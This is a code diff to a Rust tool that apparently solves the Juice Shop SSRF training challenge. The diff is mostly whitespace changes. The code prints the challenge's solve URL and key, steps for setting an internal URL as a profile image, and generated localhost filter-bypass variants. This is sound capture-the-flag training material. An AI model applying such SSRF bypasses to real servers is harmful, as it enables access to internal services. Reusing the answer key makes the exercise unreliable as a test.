@@ -69,11 +69,9 @@ fn main() {
                 eprintln!("Invalid IP address format");
                 std::process::exit(1);
             }
-            
-            let octets: Result<Vec<u8>, _> = parts.iter()
-                .map(|p| p.parse::<u8>())
-                .collect();
-            
+
+            let octets: Result<Vec<u8>, _> = parts.iter().map(|p| p.parse::<u8>()).collect();
+
             match octets {
                 Ok(o) if o.len() == 4 => {
                     let (a, b, c, d) = (o[0], o[1], o[2], o[3]);
@@ -92,12 +90,12 @@ fn main() {
             println!("=== Juice Shop SSRF Challenge ===\n");
             println!("Target URL (from malware in /ftp/quarantine/):");
             println!("  http://localhost:3000/solve/challenges/server-side?key=tRy_H4rd3r_n0thIng_iS_Imp0ssibl3\n");
-            
+
             println!("Steps:");
             println!("1. Get malware from /ftp/quarantine/");
             println!("2. Extract the internal URL");
             println!("3. Set as profile image URL\n");
-            
+
             println!("Bypass variants:");
             for variant in generate_localhost_variants(3000).iter().take(5) {
                 println!("  {} → {}", variant.name, variant.url);
